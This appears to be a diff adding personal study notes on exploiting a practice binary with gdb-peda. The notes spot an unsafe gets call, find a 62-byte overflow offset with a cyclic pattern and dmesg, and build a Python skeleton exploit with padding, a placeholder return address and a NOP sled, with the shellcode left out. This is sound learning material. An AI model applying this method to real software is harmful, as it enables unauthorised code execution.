@@ -761,27 +761,66 @@ Enter a string:
 
 #gdb
 --$ gdp <binaryname>
+gdb-peda$ 
+
+## comment out the source line
+vim ~/.gdbinit
+
+#find function
+gdb-peda$ disass main
+gdb-peda$ pdisass main
+-disregard  <__x86.get_pc_thunk.ax>
+function:
+getuserinput     #custom created function
+
+#look inside the function
+gdb-peda$ disass getuserinput
+gdb-peda$ pdisass getuserinput
+-disregard <__x86.get_pc_thunk.bx>
+call   0x3e0 <puts@plt>
+call   0x3d0 <gets@plt>
+
+peda plugin = highlighted red, vulnerable function
+** This is what peda thinks is vulnerable
 
 
+##Buffer Overflow
+0. Run the program
+./func
 
+1. Attempt to buffer overflow the program
+https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+results: Segmentation fault (core dumped)
 
+2. Determine Buffer Overflow Offset
+dmesg | tail -n 5
+last line in result:
+[4109352.932289] func[6730]: segfault at 31634130 ip 0000000031634130 sp 00000000ffffd4d0 error 14 in func[56555000+1000]
+  31634130  # plug this into the website above
+  62 characters minimum to Buffer overflow
 
+3. validate the offset & craft exploit
+###crafted exploit###
+###linux_buffer.py###
+#!/usr/bin/python
 
+#buffer
+Buffer = "A" * 62
 
+#eip (placeholder)
+eip = "B" * 4
 
+#nop
+nop = "\x90" * 10
 
+#shellcode
+print(Buffer + eip + nop)
+###crafted exploit###
+###linux_buffer.py###
 
-
-
-
-
-
-
-
-
-
-
-
+--$ gdb func
+gdb-peda$ run <<< $(python linux_buffer.py)
 
 
 
